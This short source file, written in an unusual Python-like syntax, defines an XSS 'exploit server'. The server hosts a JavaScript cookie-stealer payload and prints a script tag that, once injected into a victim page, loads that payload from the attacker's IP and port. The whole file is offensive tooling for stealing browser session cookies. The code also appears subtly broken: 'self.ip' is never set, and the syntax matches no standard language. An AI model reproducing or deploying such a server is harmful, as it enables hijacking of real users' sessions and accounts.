#'ExploitEncoding';
#'ExploitRequestHandler';
#'ExploitResource';
#'ExploitServerConfig';

class init ExploitComponent ExploitServer {
    port: ExploitServerConfig.getPort(),
    cookieStealer: ExploitServerConfig.getCookieStealer(),
    
    __init__: @(ip) {
        endpoint = self.ip, self.port;
        self.server = HTTPServer(endpoint, ExploitRequestHandler);
        self.server.payloads = dict();
        
        self.server.payloads[self.cookieStealer] = 
            ExploitResource.getJsCookieStealer(self.port);
            
        self.scriptTag = ExploitResource.getScriptTag(self.ip, self.port, self.cookieStealer);        
    },
    
    serveForever: @{
        self.log('[i] Starting exploit server');
        self.log('[i] XSS script payload:\r\n    %s' % self.scriptTag);        
        self.server.serve_forever();
    },
};